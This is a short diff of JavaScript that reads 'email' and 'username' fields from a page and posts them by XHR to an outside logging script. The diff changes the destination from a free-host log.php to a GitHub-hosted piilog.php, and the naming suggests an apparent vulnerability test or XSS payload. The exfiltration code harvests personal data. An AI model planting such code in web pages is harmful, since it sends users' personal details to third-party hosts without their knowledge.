@@ -15,7 +15,7 @@ try{
                 var email = dom.getElementById("email").value;
                 var username = dom.getElementById("username").value;
 }catch(e){}
-                xhr.open("POST","https://test-vul.000webhostapp.com/log.php");
+                xhr.open("POST","https://github.com/cybowl/test/blob/main/piilog.php");
 
 xhr.setRequestHeader("Content-Type", "application\/x-www-form-urlencoded");
 
